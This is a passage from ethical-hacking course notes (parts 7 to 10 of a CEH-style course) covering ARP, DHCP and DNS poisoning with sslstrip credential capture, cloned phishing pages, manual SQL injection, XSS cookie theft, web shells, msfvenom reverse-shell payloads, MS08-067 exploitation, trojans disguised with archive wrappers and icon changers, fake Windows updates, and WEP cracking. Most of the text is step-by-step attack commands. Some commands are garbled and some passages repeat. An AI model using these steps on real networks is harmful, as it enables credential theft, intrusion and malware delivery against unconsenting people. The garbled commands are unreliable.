![](image-qekd56t8.jpg)  

  Hacking of Computer Networks  

  Part 7: Sniffer and Phishing Hacking    Part 7 of Certified Ethical Hacker (CEH) Course    By    Dr. Hidaia Mahmood Alassouli    

Hidaia\_alassouli@hotmail.com     Part 7: Sniffer and Phishing Hacking    a. Understanding Sniffer    ![](image-4lxgx3mb.jpg)  

![](image-yu2j3rex.jpg)  b. Understanding ARP Poisoning    ![](image-6fr006op.jpg)  ARP poisoning is changing the mac address of the the gateway in the router to be the hacker mac address. The command for arp spoofing    Arp –I eth0  \-i (ip of the target)  \-t  (ip of the gateway)     ![](image-xbbgy2d3.jpg)  c. Man of the Middle Attack Using Ettercap in Command Line:    ![](image-45zzvtvw.jpg)  ![](image-4k20mfgr.jpg)

  Enable the Ip forward using the command    \# echo 1 \> /proc/sys/net/ip4/ip\_forward    Do arp poisoning    \# arpspoof –I eth0 –t 192.168.52.132(target ip)  192.168.52.2 (gateway ip)    ![](image-btkdghpz.jpg)  Edit the ip table to tell the computer that any traffic that will come in port 80 must be forwarded to port 10000\. Then edit etter.conf to tell him the edit in the ip table by removing the hash \# from the redirect commands.     ![](image-d4cvfo40.jpg) ![](image-zlg4v83f.jpg)  Then activate the ssl tools in pentest            #cd /pentest/web/sslstrip            #python sslstrip.py  \-a  (put the port if 10000 not default)    Display the results using the ettercap tool    \# ettercap –T  \-q  \-I  eth0    Test the connection from target computer and you will get the username and password.     ![](image-c1kpygn8.jpg)  d. Man of the Middle Attack Using Ettercap in Graphical Interface:  

  Repeat the steps for ip forward and iptables and sslstrips    \# echo 1 \> /proc/sys/net/ip4/ip\_forward    \# arpspoof –I eth0 –t 192.168.52.132(target ip)  192.168.52.2 (gateway ip)          #cd /pentest/web/sslstrip          #python sslstrip.py  \-a  (put the port if 10000 not default)  

  Open the ettercap. Choose sniff, unified sniffing, eth0, scan for hosts, hosts list. Then ARP poisoning, poison one way. Then start sniffing.   You can also use the windows version Cain and abel. You can also use yamas tool.     e. DHCP Starvation Attack:    ![](image-60binq2t.jpg)  In DHCP starvation, the hacker will stop the DHCP server. The hacker will make in his computer DHCP server. If the client wants IP, the hacker computer will provide him with the Ip but the gateway will be the Ip of the hacker machine and the hacker will open Ip forward to connect to internet.  The hacker will have sniffing program. When the clients want to go to internet, they will send the hacker computer the data. The data will come through the hacker computer and the hacker will forward them to internet. The sniffing program will show the user name and password of the client.    DHCP Starvation attack technique:    ![](image-og0rp2p7.jpg)  We have to install the DHCP server on the hacker computer. Then we make configuration for the scope it will distribute. We have to tell him to put in the gateway the ip of the hacker machine. Then we have to install and configure the tool Dhcpstarv. The tool can make DHCP attack and can stop the DHCP server. Then we make the steps for the sniffing techniques. When the computer writes any username and password we can see them in ettercap.  Install the DHCP server using the command    \# apt-get install dhcp3-server    

#kate /etc/dhcp/dhcpd.conf    Change the scope and put the ip of gateway router to be the hacker computer     ![](image-0q08pfbe.jpg)  Start the dhcp server by typing    

\# dhcp isc-dhcp-server start    Download the tool DHCP  starvation to stop the dhcp server in the network     ![](image-shbsb2bf.jpg)  This is the DHCP server in the windows with its scope     ![](image-nbo89r2e.jpg)

  The gateway     ![](image-zrd5byhm.jpg)   To stop the network dhcp server, go to the tool dhcpstarv    \# dhcpstarv –I eth0    ![](image-0sy35yx3.jpg)  It will reserve all the ips in the scope of the network dhcp server     ![](image-wpq8z5us.jpg)  We will enable the ip forward in the hacker machine and we make the settings of the iptable . Then we run the sslstrip     ![](image-f71seuos.jpg)  We run the ettercap to show the username and password.     ![](image-qravwu18.jpg)  Test the connection. Use any computer to the network to login yahoo. In the hacker computer we can get the username and password.     

![](image-ub9eciuj.jpg)  f.  Understand MAC Spoofing:    ![](image-w0ofnpca.jpg)  The MAC address     ![](image-h4wj9t62.jpg)  The MAC address consists of 6 bytes. The first 3 bytes concerns the vendor. The other three bytes given by the company that distributes the network cards. We can make spoofing for the mac address which means that we hide my mac address to take another mac address. We need that in some hacking purposes.  To make mac spoofing in windows:     ![](image-d2b2ohdl.jpg)  ![](image-0g3cbdsp.jpg)  In Linux, we can use tool called mac changer that can change the mac address to be random mac address. First disable the network card    #ifconfig eth0 down    #macchanger –r eth0  (will make random mac address)    #macchanger –m (mac address)  (if we want to put certain mac address)    #if config eth0 up.    ![](image-fqtg73yj.jpg)  

g. Phishing:    ![](image-z619cx0l.jpg)  We can make fake website and then we ask the client to enter this website. In this way we can get the user name and password.  We can make phishing in internal or external network. You can make it by manual or by some tools with DNS poisoning     ![](image-k19ncyue.jpg)  Install a web server in the internal network. Take the facebook source code. Change the source code near action to be the following     ![](image-wro0atwz.jpg)  Use the file post.php.     ![](image-86hqtthu.jpg)  Change the url in the file    ![](image-mc496s70.jpg)  Take the files index.php and post.php and save them in your web server.  Shorten the ip in the web site goo.gl or j.mp. When the use log in the face book through your fake web page, he will be directed to original web site. You can see his username or password in the file usernames.txt.     ![](image-etmrpzp6.jpg)  h. Phishing in Internal Netwok with DNS Poisoning:    

![](image-nwta0vmy.jpg)  DNS poisoning is to poison the DNS. In this way and user want to go to some site like the hacker will resolve its ip so it comes to hacker computer first and it will save its username and password and then forward the client to the original website. This technique employed in i  Operate the set tool kit. Choose 1 for social engineering attack. Then 2 for web site attack vector. Then choose 3 for credential harvester attack method. Then choose 2 for site cloner. Put the hacker computer ip. Then enter the website that you want to make for it phishing ie  Then make the dns poisoning. Edit the etter.dns     ![](image-48hrpgv3.jpg)  Operate the ettercap by typing ettercap \-G. Choose sniff, unified sniffing. Then scan for hosts. Then choose mitm and  choose sniff remote connections. Choose dns\_spoof plugin. Then start sniffing.  Understand DNS Cash poisoning     ![](image-b6hntuw6.jpg)  We can do it in windows machine also    Part 8: Hacking Web Servers    Part 8 of Certified Ethical Hacker (CEH) Course    By    Dr. Hidaia Mahmood Alassouli    Hidaia\_alassouli@hotmail.com  

   Part 8: Hacking Web Servers    ![](image-lv2f4hgc.jpg)  ![](image-scxpkxxs.jpg)  The data base injection is to inject the database with certain data to alter the database and execute certain commands on the system that has this database.    ![](image-wuxfi5k2.jpg)  If we put ' and we het error code, then the website has mysql injection.    ![](image-ta0glr1w.jpg)  ![](image-alvweisu.jpg)  

![](image-cra3x36k.jpg)  Download netsparker to scan web site     ![](image-k91xwpr6.jpg)  Take the vulnerable url    ![](image-1uokx2td.jpg)  

Open Havjj tools     ![](image-3azw3d4o.jpg)  Using webcruiser    

  ![](image-iguhy0cl.jpg)  ![](image-n9xd1ywr.jpg)  ![](image-y0vnz5dd.jpg)  

![](image-kpkz854o.jpg)  Take the cookie using the temper data plugin  

   ![](image-t295ef9z.jpg)  Take the url of the website     ![](image-vz3falqg.jpg)  Go application, backtrack, exploitation tools, web exploitation tools, sqlmap    Write the command    \# python sqlmap.py –u 'url' –cookie 'cookie' \--dbs  

  ![](image-68nht2um.jpg)  We will get all the databases     ![](image-fg72xip1.jpg)  Change the command to put the data base name and show the tables in that database     ![](image-97a4qd9z.jpg)  Change the command to put the data base name and table name and to show the users in that database     ![](image-ns2m7o8a.jpg)  Put the command to show all users information     ![](image-ehjzt7x0.jpg)  It will ask if he has to do dictionary attack, answer yes     ![](image-kpkz854o.jpg)  Take the cookie using the temper data plugin     ![](image-t295ef9z.jpg)  Take the url of the website  

   ![](image-vz3falqg.jpg)  Go application, backtrack, exploitation tools, web exploitation tools, sqlmap    Write the command    \# python sqlmap.py –u 'url' –cookie 'cookie' \--dbs    ![](image-68nht2um.jpg)  We will get all the databases     ![](image-fg72xip1.jpg)  Change the command to put the data base name and show the tables in that database    ![](image-97a4qd9z.jpg)  Change the command to put the data base name and table name and to show the users in that database     ![](image-ns2m7o8a.jpg)  Put the command to show all users information     ![](image-ehjzt7x0.jpg)  It will ask if he has to do dictionary attack, answer yes     ![](image-584pybdx.jpg)  Sometimes we cant use the SQL injection tool because of the firewall. So you need to depend on yourself manually. You need to know the no of columns in the table and through this way you can run the commands on the server. We will use the technique order by.  

Make the security medium in DVWA  Go to SQL injection and put query by entering user id    http://192.168.52.134/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#    ![](image-tvxd8wvv.jpg)  After user id, put the order by (n0) \--, ie 5—then decrease it       http://192.168.52.134/dvwa/vulnerabilities/sqli/?id=2 order by 5-- &Submit=Submit#         You will get error    It will work when order by 2--, so there is 2 columns    http://192.168.52.134/dvwa/vulnerabilities/sqli/?id=2 order by 2-- &Submit=Submit#         We want to know the affected column, so we can run the commands we want to run, so we will use union select. We can download tool called hack bar to write the commands  

  http://192.168.52.134/dvwa/vulnerabilities/sqli/?id=2 union select 1,2-- &Submit=Submit#       ![](image-fftqp20l.jpg)  The affected column is 2     ![](image-75wkme4q.jpg)  

To know the database, write    http://192.168.52.134/dvwa/vulnerabilities/sqli/?id=2 union select 1,database()-- &Submit=Submit#    ![](image-orl6dzdu.png)  To know the user, write    http://192.168.52.134/dvwa/vulnerabilities/sqli/?id=2 union select 1,user()-- &Submit=Submit#    ![](image-x0z5te02.jpg)  To know the version    

http://192.168.52.134/dvwa/vulnerabilities/sqli/?id=2 union select 1,version()-- &Submit=Submit#    ![](image-k91b0w4d.png)  To query the data in the SQL database  

  http://192.168.52.134/dvwa/vulnerabilities/sqli/?id=2 UNION select distinct(table\_schema), null FROM information\_schema.tables \--&Submit=Submit#     ![](image-ozm4tbn6.jpg)  ![](image-ruykuypx.jpg)  To see the tables in the database DVWA http://192.168.52.134/dvwa/vulnerabilities/sqli/?id=2 union select table\_name, null from information\_schema.tables where table\_schema=dvwa \-- &Submit=Submit#  But you need to encode dvwa    http://192.168.52.134/dvwa/vulnerabilities/sqli/?id=2 union select table\_name, null from information\_schema.tables where table\_schema=0x64767761 \-- &Submit=Submit#    ![](image-6f8whbah.jpg)

  ![](image-thvsl7g2.jpg)  ![](image-kd6x08kz.jpg)  To see the users in the database DVWA http://192.168.52.134/dvwa/vulnerabilities/sqli/?id=2 union select first\_name, password from dvwa.users \-- &Submit=Submit#     ![](image-fypdrdsy.jpg)  ![](image-fm0ybwv4.jpg)  ![](image-wa433pg7.jpg)  

Use the union select nul – to know the number of tables and number of columns in the table.  Go to mutillidae, then injections, SQLi extract data, user info. Write    'union select null \--    ![](image-w9joc9hn.jpg)  You will get error message     ![](image-ldtrkgqx.jpg)  Increase the no of nuls until you don’t get error. After 5 nulls I got the answer    'union select null, null, null, null, null--  

  ![](image-06bgv06z.jpg)  To load the file, change one of the commands to load\_file('/etc/passwd/')     ![](image-brixjqpo.jpg)  You can insert in the database the value we want     ![](image-so2n93ss.jpg)  ![](image-fnhz7uav.jpg)  We depended before in the error message. In blind SQL injection we will depend on sql injection without errors. Go to blind sql injection in dvwa> Make the security medium.  To get the no of columns, write in the box    1 union select null,null--    ![](image-1c3166vv.jpg)  

Another  technique is to write  1 union select 1,2--  To load file,    1 union select 1, load\_file (/etc/passwd)—    If it does not work, give it the passwd file in hex.    1 union select    ![](image-yrbcucey.jpg)  

The reason that there is hole in the web application program that allows the hacker to execute command or browse the computer. If the hacker wrote a script code and the web application executed the code, then the application has a CSS hole.  There are persistent XSS attacks and reflected XSS attacks     ![](image-3etujs31.jpg)

  The reflected XSS attack is through injecting the url, and we call it url inject. In persistent XSS attack, it stores it in the database and this is very dangerous since anybody will visit the post, the code will be applied on its computer .    ![](image-hjdz9mue.jpg)  To know whether the website has the XSS hole, test that on mutillidae. Go to DNS lookup.  To know if the web application has the xss hole, write the script                  You will get 1  

        To know the session id on cookie, we write               To direct you to other website write             We can use the link directly     ![](image-eweznjnm.jpg)  We can take the cookie of the admin in the website and then we can make login with the cookie and take the admin privilege. We will work on script that will direct to faked hacker web server and we will tell him to inject the cookie. In the hacker computer, we will operate any listener that can see the request  There is web site that can encode the url.  

   ![](image-rsft99uj.jpg)  ![](image-r0hlvpkl.jpg)  We make a listener     ![](image-opj44n2j.jpg)  The admin will open the link that you sent through the emil     ![](image-ht8vqalc.jpg)  The hacker will listen on the port 80\. He will get the admin session id from the cookie of the admin     ![](image-ytopoit2.jpg)  The hacker will browse the application website. He will use temper to change the session id to the hacker session id    

  ![](image-a60u6hh0.jpg)  ![](image-8o0q34mz.jpg)  The browser autopwn makes the machine web server and anybody will browse it will apply all the exploits for the browser and any exploit it will find in the browser will make though it gain access to the web server and reverse connecrion to hacker machine  Go to back track and operate the armitage. Put the LHost and SRVHOST the hacker machine Ip and the SRV port 80 and URIPATH /.     ![](image-x4gqwmfn.jpg)  Install the firebug in order to adjust the sizes of the browser elements so it can withstand the script.  

   ![](image-56rl3drj.jpg)  When the client go to the guest book, it will be forwarded to hacker computer.  You can use instead of browser autopone module the java\_signed\_applet. We put in LHOST the hacker computer Ip and LPort the port any port and decide the type of the payload to be java/meterpreter/revers\_tcp. The SRVHOST same as our ip and the SRVPort 80 and URI path /  

   ![](image-jv1qw83m.jpg)

  Any body will browse the link will send him the java/meterpreter/reverse\_tcp payload  When the client go to the guest book, it will be forwarded to hacker computer and will download the payload.     

![](image-i1oj8csz.jpg)  We can through the infected url excute certain commands in unix and windows. We can upload payload and through this payload we can hack the server.  You can browse the webserver  You can upload payload in the web server. We will use msfvenom. Msfvenom is combination of msfpayload and msfencode.    Msfvenom –p  php/meterpreter/reverse\_tcp lhost (ip of hacker computer) lport=(any)  \-f raw \> /root/test.php    ![](image-phnb2l11.jpg)

  Remove the hash from the php file  We have to copy the payload in the web server but it must be text file  

  Cp /root/test.php  /var/www/test.txt    We will apply the command in the website to upload the payload through the wget command    ![](image-lvdsxn0a.jpg)

  ;wget \-O  /tmp/test.php ; php –f /tmp/test.php  

  ![](image-fby9b7zn.jpg)  Prepare the multi handler.        #msfconsole    

    \# use exploit/multi/handler      \# set lhost (hacker ip)  

    \# set lport (ip we put for the payload)      \# exploit    ![](image-duu6gqdc.jpg)

  Make sure to install the php in the webserver you want to hack     ![](image-b23e3ykx.jpg)  ![](image-cchapv37.jpg)  It is a way of cracking passwords where we can get username and password to gain access on the website we want to hack.We will use the brute force in order to gain access to the web server. It happens through the get and post request. We have many tools that we can do through it the brute force. There is bruter tool, burpsuite,     Go to dvwa brute force. Addon live http header. Enter in user name and password.  Take the header information  

   ![](image-p45qmg6q.jpg)  Put the information in bruter    

  ![](image-nfoz7hi9.jpg)  Choose to use the brute force     ![](image-ws3637tk.jpg)  Try in the mutillidae website with burp suite. Change the proxy settings in firefox to be ip address 127.0.0.1 and port no 80\. It was difficult to use.  You can use the hydra tool     

![](image-gdiberss.jpg)  ![](image-bscsvfdx.jpg)  ![](image-l2g33qb6.jpg)  In local file inclusion, if the web application has the hole local file inclusion, through this hole we can read files inside the webserver like /etc/passwd .  In DVWA, go to file inclusion.     ![](image-ncbgnl95.jpg)  Change include with the file you want to download /etc/passwd  

   ![](image-u3u2xvj3.jpg)  Most important file we can download     ![](image-xtz7cl3b.jpg)  In windows machine we use another command    Page=../../../boot.ini    ![](image-44k4auqu.jpg)  When the web application has this hole, we can put another page inside this website. This web page called web shell.  Understanding web shell     

![](image-zbgor4lx.jpg)  The shell is written any programming language, and mostly in php. Through the remote file include we can gain access in the web server and apply the shell on it. There are some ready shells like C99.php, R57.php, C100.php.  C99 shell     ![](image-ja1c0n2d.jpg)  R57     ![](image-nhf13zlf.jpg)  Web server shell to execute any program\\     ![](image-xy2njw9n.jpg)  Put the shell in the folder /var/www. Put the shell as text file in the hacker computer. Start the apache server  Go to mutillidae web site.     ![](image-k7u69cqh.jpg)  Change home.php to the hacker computer shell address http://192.168.52.134/c99.txt     ![](image-4rzxa6co.jpg)  Try in the dvwa. But instead of local file we put the shell website address    http://192.168.52.134/dvwa/vulnerabilities/fi/.?page=include.php  

  http://192.168.52.134/dvwa/vulnerabilities/fi/.?page=    http://192.168.52.134/mutillidae/?page=text-file-viewer.php       ![](image-9u7tts74.jpg)

  We can create payload and upload it in the web server     ![](image-bidyiz9c.jpg)  Create the php/meterpreter/reverse\_tcp payload in the hacker computer    

  ![](image-ftb2hlk6.jpg)

  Open the file and remove the hash command in the php file.  Go to /var/www in hacker computer and put on it the payload. Start the apache service.  Open the multi handler in the same way     ![](image-v40eleja.jpg)  Using the browser upload the payload to the web server.     ![](image-r0nny65e.jpg)

  It will open the meterpreter session     ![](image-pd71bd2g.jpg)  

![](image-jqa1t0qq.jpg)  

It means that the website enables us to upload some files such as images or scripts.  We can upload shells and makes it excitable and we can control the web server. We can make reverse tcp payload and upload it in the web server and make it excutable and we control the web server  Go to DVWA and change security low. Go to file upload and upload shell.     

![](image-cgkj5u6p.jpg)  Browse the shell    

  ![](image-ayrqvjzm.jpg)  

![](image-veiogf50.jpg)  We can up load php reverse tcp payload. Create the payload. Remove the hash from the php file  

   ![](image-mp6g8vej.jpg)  Run the multi handler     ![](image-4tsqs3ps.jpg)

  Upload the payload in the website using the upload hole.     ![](image-qvmq00tj.jpg)  

Execute the payload. Meterpreter session will open.     ![](image-g0c9ogkm.jpg)  ![](image-nlg7bryv.jpg)  Through CSRF hole, we can create and change user information and change certain data in the web site  We need tool called csrf tester. We can download it from the web site. I did not try to apply the method as it was difficult.    Part 9: Hacking Windows and Linux Systems    Part 9 of Certified Ethical Hacker (CEH) Course    By    Dr. Hidaia Mahmood Alassouli    Hidaia\_alassouli@hotmail.com  

  Part 9: Windows and Linux Hacking  

  ![](image-53ftb8jd.jpg)  ![](image-oz9uxq58.jpg)  ![](image-hx9qckzr.jpg)  The Trojan program will make server which can be installed in the client computer we want tohack. The reverse connection will make the server in the client computer makes connection on the Trojan program.   

  ![](image-uxozyzpr.jpg)  Steps to attack windows xp sp3      ![](image-p87c0w65.jpg)  Scan the subnet using the command nmap –A to find windows machine    Nmap  \-A  192.168.1.0 254    Msfconsole    

Use exploit/windows/smb/ms08\_067\_netapi    Set rhost 192.168.52.132    (the other win xp machine that has the exploit)    exploit    

![](image-36gqtpu0.jpg)  Then you can work in the interpreter session and write any command.  Some commands: ls, sysinfo, hashdump, screenshot, ipconfig, shell  When you go to shell you can use the dos commands: net share, ipconfig /all, tasklist, net user, net share, netstat \-anb     ![](image-8vyyokh2.jpg)  You can run payload in the computer using this hole     ![](image-9aodj2f6.jpg)  Msfconsole  

  Use exploit/windows/smb/ms08\_067\_netapi    Set PAYLOAD windows/meterpreter/reverse\_tcp    Set LHOST 192.168.52.135       Set LPORT 4444    

Set RHOST 192.168.52.132 (the other win xp machine that has the exploit)    Exploit    ![](image-joni1zcv.jpg)  You can use also armitage  

   ![](image-xibc09uk.jpg)  ![](image-y1fpwpjh.jpg)  It is a client side attack. When the hacker uses java signed applet module  in the metasploite it will act as web server and will have a website that have Java meterpreter reverse tcp payload. It requires that the client have java application to execute the java payload. Anybody will go to the website will download and install the payload and the hacker can control the computer.  It can hack any machine that has the javal application.   You set the the LHOST and the RHOST the hacker ip address. The LPORT can be any port and RPORT put 8080 or 80 or any other port. Put the URI part /.    

  ![](image-funhx6gi.jpg)  

![](image-6xrrcjnb.jpg)  We will do fake site for www.google.com and when any person in the local network wants to go for this web site he will come first for your fake website and the fake website will download payload to the client computer.  Go to back track then exploitation tools then social engineering tools then social engineering toolkit then the set command.     

![](image-l0sb60lu.jpg)  Set \> ./ setup.py install    ./set-update    ./settoolkit    ![](image-pvaco2wc.jpg)  

Choose 1 for social engineering attack. Then 2 for website attack vectors. Then 1 for java applet attack method. Then 2 for site cloner.     ![](image-atw7mlx6.jpg)  ![](image-1ox05gwq.jpg)  ![](image-fw5jxcwb.jpg)  Then choose n to apply the method for the computers in the internal networks only. Put the Ip for the hacker computer 192.168.52.135. Then put the website that you want to make phishing for it http:/www.google.com.     ![](image-pv7e1hqf.jpg)  It will ask you the type of payload you want to use with java signed applet. Choose 12 which is SE toolkit http reverse shell encryption support     ![](image-cg6iie4i.jpg)

  Put the port listener 6666     ![](image-2qd6br6n.jpg)  Gedit the file etter.dns. Put the IP for your fisher website     ![](image-iow9q2dh.jpg)  Write the command: ettercap –G the get the ettercap GUI. Put sniff and choose the interface then choose unified sniffing. Then choose hosts then go to host list. Then go mitln and choose arp poisoning, poison one way. In plugins, choose dns\_spoof plugin. Then choose start sniffing.     ![](image-hxei79gf.jpg)  When the client in the internal network go to he will go to your fishing site. You will see in back track set command a shell where you can write commands for the client computer. Try the commands ipconfig,     ![](image-4t9b9bna.jpg)  ![](image-68dg9l1m.jpg)

  The hacker can make his computer a fake webserver and he can make on it a website that  can utilize the client browsers security holes to hack its computer. Any client will visit the hacker website, it will apply the exploits for the browser.  Start armitage. Search for browser\_autopone. Put LHOST and SRVHOST the IP of the hacker machine, the Srvport \= 80, URI Path=/      ![](image-vbojkjod.jpg)  You can shorten the url using the website bitly.com. When it will hack the client , it will open the meterpreter session.     ![](image-3nl35rn6.jpg)  Note: The antivirus will detect the autopone and block the connection  

  ![](image-c5p6gkmb.jpg)  The hacker can make his computer a fake webserver and he can make on it a website that  has fake plugins. Any client will visit the hacker website, the firefox will try to download the plugins and will download also java meterpreter reverse tcp payload.  In the msfconsole, search firefox. Use the exploit/multi/browser/firefox\_xpi\_bootstrapped\_addon. Set the payload windows/meterpreter/reverse\_tcp. Set the Lhost and Rhost the hacker computer and the Lport any port and the srvport to be suitable port.     ![](image-ibz4kyaj.jpg)  To see the sessions we writes the command "sessions –l". To choose the    first session write "session –I 1".    Note: The firefox will detect the unverified plugins and will not install it    

![](image-aflpu3jd.jpg)  

Download Veil-master tool    \# cd Veil-master    Cd setup    ./setup.sh    Python veil.py    Choose list     ![](image-9jppnza4.jpg)  Choose the payload 9: Powershell/virtualalloc. Then choose generate the payload. Choose msfvenom. Choose the windows/meterpreter/reverse\_tcp. Choose the lhost the ip of the hacker machine 192.168.52.135. Choose any lport. Choose the name of payload.     

![](image-eodg1ea4.jpg)  ![](image-64zub2ys.jpg)  Attach the payload with another program using any archive program such as winrar. Then use the icon changer to change the icon . Ask the client to download the file using any trick  Operate the multi-handler tool msfcli to hack the client>    \# msfcli multi/handler payload=windows/meterpreter/reverse\_tcp lhost=192.168.52.135 lport=4444 E     

![](image-lecadmxi.jpg)  After the user open the program, the meterpreter session will open    ![](image-8xqoiom3.jpg)  We will do fake update for windows and through the fake update we will download the payload type windows interpreter reverse tcp which will do reverse connection with the hacker computer and through the meterpreter session you can control the client computer.  

Install evilgrade. To get the modules type    #./evilgrade    ![](image-gphmqsqk.jpg)  \# configure winupdate    \# show options    Create the payloads in other command lines    \# msfpayload windows/meterpreter/reverse\_tcp lhost=192.168.52.135 lport=5555 x \> /root/hedaya1.exe    ![](image-ub6somq6.jpg)  Return to evilgrade to tell it about the payload  

   ![](image-j0s2bnhl.jpg)  Edit the file etter.dns     ![](image-n4lqhcod.jpg)  

Operate ettercap in command line    \# ettercap –T –Q –M –P dns\_spoof /192.168.52.2/  //    (ip of the machine gateway)    ![](image-p9owfmon.jpg)  Operate the multihandler    #Msfcli multi/handler payload=windows/meterpreter/reverse\_tcp lhost=192.168.52.135 lport 5555 E    

![](image-skqnujm8.jpg)'    Go to evil grade and write stat    Evilgrade \> start                    \>status    ![](image-ou8o0se1.jpg)  Test on the client. The client will do windows update. The client will go windowsupdate.microsoft.com. From interpreter you can control the client computer. The command run vnc can do anything in the client computer.    ![](image-q32i51ml.jpg)  MS12 is exploit that targets the RPC service that is responsible on the remote connection.  You can use the rdpex.py script in the cd to crash the server     ![](image-6beqy3b7.jpg)  To discover the network use    netdiscover –r 192.168.52.0/24  

  nmap –sV –O (IP address)  to scan for services and see if the terminal service open (port 3389 ms-wbt-server)    ![](image-sjebhy32.jpg)  You can use the rdpex.py script to crash the server     ![](image-6beqy3b7.jpg)  ![](image-98a21sxg.jpg)  It is web application. When the client browse this website, the hacker can apply java payloads on the client computer.  Go and install Beef from back track, go exploitation tools, social engineering tools, BeEF XSS framework, BeEF  

After the installation, you will get the hook url and uri url    Hook url: http://127.0.0.1:3000/js    Uri url: http://127.0.0.1:30000/uri/panel    ![](image-sg8zxjki.jpg)  Use the username beef and password beef to enter the control panel     ![](image-0dpccmz5.jpg)

  Change index.html in the apache  /var/www/index.html and restart apache2     ![](image-v3xnzpn7.jpg)  We can redirect the browser to certain website    

  ![](image-k7g7ssgy.jpg)  In the armitage, create the java\_signed applet payload and put the SRVhost ip and lhost ip same as the hacker computer ip. Take the link and paste it under redirect browser section in the beef application. When the client will enter the link the computer will be hacked    

  ![](image-cx9p5z8p.jpg)  ![](image-vfyg272b.jpg)  The linux has less number of holes than the windows, but linux can be hacked with payloads.  Got to msf3 folder and write the command msfpayload linux. Then use the command msfcli multi/handler to control the hacked machine when the client run the payload     ![](image-t0c8elif.jpg)  Part 10: Wireless Hacking    

Part 10 of Certified Ethical Hacker (CEH) Course    By    Dr. Hidaia Mahmood Alassouli    

Hidaia\_alassouli@hotmail.com    

Part 10: Wireless Hacking Networks in Linux    ![](image-fccpn63h.jpg)  ![](image-z1ycxjwl.jpg)  There is access point which is the device that transmit the signal. There is wireless adapter which is the device that connects to access point. Essis is the name of the wireless network. Channel is a number that represents certain radio communication frequency and the encryption is the process of encoding messages using WAP – WEP – WPA2. It is divided to two steps, authentication and encryption.     ![](image-vjowx1co.jpg)  

![](image-ehjo73t9.jpg)  ![](image-4qy4ougg.jpg)  The WEP authentication is there with 64 bit, 128 bit and 256 bit. You put the preshared key. The access point generate IV and it is a key with 24 bit long. The WEP seed goes to algorithm RC4 Cipher then it goes to keystream, then it goes to CRC-32 to make error correction and detection. It takes the data and ICV . It makes XOR operation for the data and the keystream     ![](image-joxefsxr.jpg)

  To know whether the wireless card support the injection use the commands airmon-ng or iwconfig     ![](image-h4na1f37.jpg)  You need to know whether the backtrack see the network    #airmon –ng         Or    

#iwconfig         To activate the monitoring mode, write    #airmon –ng    start  wlan1 (network card)    ![](image-yiu4vzod.jpg)  To see the wireless networks around me    

#airodump –ng      mon0     To stop the monitoring mode    #airmon –ng    stop mon0    #airmon –ng    stop  wlan1   

  To activate the monitoring mode on access point we want to access on it    #airmon –ng    start  wlan1  6 (channel access point number)    To know whether the access point support the injection facility or not    

#aireplay –ng \-9  \-e demo  –a    (mac address)  mon0                  (or \--test)    It must write injection is working    

![](image-rjy1zzm7.jpg)  Aircrack is the best tool for cracking WEP with connected client.    It monitors the packet on wireless network to get the IV and from IV we get the password    #iwconfig    

#airmon –ng    start  wlan1     ![](image-qca323so.jpg)  To see all networks around me    #airodump –ng      mon1     It will bring all the networks around you  

  ![](image-c4h795pf.jpg)

#airodump –ng      \-c 2 (ch no) –bssid (mac)  \-w  www  mon1    The packet captured will be saved in file www    For thick authentication    #aireplay –ng  \-1  \-0  \-e  demo  \-a  (mac address of access point)  \-h (mac address of the client I want to use to crack the packet)  mon1     ![](image-a8fx55et.jpg)  

Make arp request to speed up capturing packets.        #aireplay –ng  \-3  \-b  (bssid)    h (mac address of the client I want to use to crack the packet)  mon1         ![](image-beb55ayx.jpg)  After 20000 packets, open new window and write      #aircrack –ng  \-b (bssid)  ww\*.cap         

Then you can find the wireless password. So from one client in the network, you can find the WEP authentication     ![](image-3xbl07px.jpg)  ![](image-eap4gt7k.jpg)  ![](image-y19higd0.jpg)  

In order to find the WEP authentication password without a client connected to access point, we need another technique. It will use the monitoring mode of my device instead the mac address of the client using the access point  Go to linux and write      #iwconfig    ![](image-s2ru9vvm.jpg)  

Activate monitoring mode    #airmon–ng    start  wlan1     ![](image-sfy2rghc.jpg)  To see the networks around me    #airodump –ng      mon0    

![](image-stw36om8.jpg)  The mon0 will make virtual adapter network. To know the mac address of the monitoring mode virtual adapter  network    #ifconfig   

  ![](image-7y4klzek.jpg)  To capture the packets    #airodump –ng      \-c 3 (ch no) –bssid (mac)  \-w  eee mon0    ![](image-hhc07uw6.jpg)  Make thick authentication    

#aireplay –ng  \-1  \-0 –e demo  \-a (mac address of the access point) –h (mac address of monitoring mode) mon0    ![](image-6hf7lsur.jpg)  Make arp request to speed up capturing packets.    #aireplay –ng  \-3  \-b (mac address of the access point) –h (mac address of monitoring mode) mon0    ![](image-wra54etq.jpg)  Wait until 20000 packet.  

Make airOpen new window and write      #aircrack –ng  \-b (bssid)  ee\*.cap         Then you can find the wireless password. So from one client in the network, you can find the WEP authentication    ![](image-vrntesv6.jpg)  ![](image-ibetmwdr.jpg)

  The smart access point will drop the packets that have long lengths, so we cant apply the previous two methods as the access point will drop the arp request so we cant reach responses and to search the file for the password. In this method, through the aireplay and aircrack tools, they will predict  some packets to reach the length that the access point can deal with it and can extract all information in file. We will take the file and through some tool we will inject them in network. In this way we will reach to response that we can capture in file and we ask the aircrack tool to search on it for password.     Go to linux and write    #iwconfig    ![](image-arqe3kfh.jpg)  Activate monitoring mode    #airmon –ng    start  wlan1     To see the networks around me    #airodump –ng      mon0    ![](image-3q65e41e.jpg)

  To capture the packets    #airodump –ng      \-c 3 (ch no) \--bssid (mac)  \-w  ddd mon0    ![](image-u97v8j3v.jpg)  Make thick authentication    #aireplay –ng  \-1  \-0 –e demo  \-a (mac address of the access point) –h (mac address of monitoring mode) mon0    ![](image-j4c7uni6.jpg)  #aireplay –ng  \-4  \-b (mac address of the access point) –h (mac address of monitoring mode) mon0    Make thick authentication  

  #aireplay –ng  \-1  \-0 –e demo  \-a (mac address of the access point) –h (mac address of monitoring mode) mon0    #aireplay –ng  \-4  \-b (mac address of the access point) –h (mac address of monitoring mode) mon0    ![](image-grlemiuf.jpg)![](image-dlexwnep.jpg)  After it finishes, it will save two files in keystream and  plaintext files.    Use the tool packetforgee to create arp packets to inject them    #packetforgee–ng  \-0  –a  (mac address of the access point) –h (mac address of monitoring mode) –k 255.255.255.255 \-l 255.255.255.255 –y (file stream name) –w eduors    ![](image-glklk2nh.jpg)  Inject the packets in the network    #aireplay –ng  \-2  \-r  eduors  mon0    ![](image-2cokecth.jpg)  Open new window and write      #aircrack –ng  \-b (bssid)  dd\*.cap         Then you can find the wireless password.    

